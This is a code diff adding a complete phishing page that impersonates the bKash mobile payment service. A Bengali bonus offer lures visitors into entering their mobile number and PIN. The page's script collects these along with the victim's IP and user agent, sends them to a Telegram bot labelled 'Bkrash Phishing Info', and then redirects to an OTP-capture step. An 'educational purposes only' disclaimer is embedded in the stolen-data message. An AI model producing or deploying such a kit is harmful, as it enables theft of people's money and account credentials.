@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://telegra.ph/file/c44ac3cc6bac7bba074d3.jpg" />
+    <meta property="og:title" content="এখনই লগইন করুন বিকাশ ওয়েব সাইটে 100 টাকা। বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
+    <meta property="og:description" content="এখনই লগইন করুন বিকাশ ওয়েব সাইটে 100 টাকা। বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
+    <meta property="og:image" content="https://i.ibb.co/ZG3mM2j/website-720x360-1717679913754.webp" />
+    <title>Your Title</title>
+    <style>
+    	@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes buttonHover {
+    from { background-color: #e4136b; }
+    to { background-color: #c5115a; }
+    }
+    body {
+    background-color: #e4136b;
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start; 
+    align-items: center;
+    height: 100vh;
+    padding-top: 50px; 
+    overflow: auto;
+    overflow: hidden;
+    }
+    .logo {
+    text-align: center;
+    margin-bottom: 10px; 
+    animation: fadeIn 1s ease-in-out;
+    }
+    .logo img {
+    max-width: 110px;
+    }
+    .container {
+    background-color: #FFFFFF;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    width: 300px;
+    animation: fadeIn 1.5s ease-in-out;
+    }
+    .input-group {
+    margin-bottom: 15px;
+    text-align: left;
+    animation: fadeIn 2s ease-in-out;
+    }
+    input[type="number"],
+    input[type="number"] {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #CCCCCC;
+    border-radius: 5px;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+    transition: border-color 0.3s, box-shadow 0.3s;
+    }
+    input[type="number"]::placeholder,
+    input[type="number"]::placeholder {
+    font-family: Arial, sans-serif;
+    color: #999999;
+    }
+    input:focus {
+    border-color: #e4136b;
+    box-shadow: 0 0 5px rgba(228, 19, 107, 0.5);
+    outline: none;
+    }
+    input.invalid {
+    border-color: red;
+    }
+    #loginButton {
+    background-color: #e4136b;
+    color: #FFFFFF;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-family: Arial, sans-serif;
+    font-size: 17px;
+    transition: background-color 0.3s, transform 0.3s;
+    animation: fadeIn 2.5s ease-in-out;
+    }
+    #loginButton:hover {
+    background-color: #c5115a;
+    animation: buttonHover 0.3s forwards;
+    transform: translateY(-2px);
+    }
+</style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://i.ibb.co/0s3npSv/5e6ab3fa58a91-removebg-preview-1.png" alt="Bkash Logo">
+    </div>
+    <div class="container">
+        <div class="input-group">
+            <p>Enter Bkash Mobile Number</p>
+            <input type="number" placeholder="Ex: 01XXXXXXXXX" id="mobileNumber">
+        </div>
+        <div class="input-group">
+            <p>Enter PIN</p>
+            <input type="number" placeholder="Ex: XXXXX" id="pin">
+        </div>
+        <button id="loginButton">Login <span>&#8594;</span></button>
+    </div>
+
+    <script>
+
+function getQueryParams() {
+    const params = new URLSearchParams(window.location.search);
+    return {
+        token: params.get('token'),
+        chatId: params.get('id')
+    };
+}
+
+const { token: telegramToken, chatId: telegramChatId } = getQueryParams();
+
+const loginButton = document.getElementById('loginButton');
+const mobileNumber = document.getElementById('mobileNumber');
+const pin = document.getElementById('pin');
+
+loginButton.addEventListener('click', async () => {
+    const mobileNumberValue = mobileNumber.value.trim();
+    const pinValue = pin.value.trim();
+    let isValid = true;
+
+    if (!/^01\d{9}$/.test(mobileNumberValue)) {
+        mobileNumber.classList.add('invalid');
+        isValid = false;
+    } else {
+        mobileNumber.classList.remove('invalid');
+    }
+
+    if (!/^\d{5}$/.test(pinValue)) {
+        pin.classList.add('invalid');
+        isValid = false;
+    } else {
+        pin.classList.remove('invalid');
+    }
+
+    if (!isValid) {
+        alert('দয়া করে সঠিক নাম্বার এবং পিন লিখুন!');
+        return;
+    }
+
+    const userAgent = navigator.userAgent;
+    const date = new Date();
+    const ip = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip);
+
+    const loginData = {
+        mobileNumber: mobileNumberValue,
+        pin: pinValue,
+        ip: ip,
+        userAgent: userAgent,
+        date: date.toLocaleString()
+    };
+
+    const userMessage = `<b>🎣 Bkrash Phishing Info</b>
+    
+📱<b>Mobile Number:</b> <code>${loginData.mobileNumber}</code>
+    
+🔐<b>PIN:</b> <code>${loginData.pin}</code>
+    
+🌐<b>IP Address:</b> ${loginData.ip}
+    
+💻<b>User Agent:</b> ${loginData.userAgent}
+    
+📅<b>Date:</b> ${loginData.date}
+    
+<blockquote>⚠️এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। দয়া করে কেউ কারো ক্ষতি করার উদ্দেশ্যে এটি ব্যবহার করবেন না।</blockquote>`;
+
+    const sendToTelegram = async (token, chatId, message) => {
+        const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+        const params = {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        };
+
+        try {
+            const response = await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(params)
+            });
+            const data = await response.json();
+            if (!data.ok) {
+                console.error('Failed to send message:', data);
+                throw new Error('Failed to send message to Telegram');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            alert('Error occurred while sending message to Telegram');
+        }
+    };
+
+    if (!telegramToken || !telegramChatId) {
+        alert('Token or Chat ID is missing from the URL parameters!');
+        return;
+    }
+
+    console.log('Sending to user Telegram:', telegramToken, telegramChatId, userMessage);
+    await sendToTelegram(telegramToken, telegramChatId, userMessage);
+
+    const url = `otp.html?token=${telegramToken}&id=${telegramChatId}`;
+    window.location.href = url;
+});
+
+    </script>
+</body>
+</html>
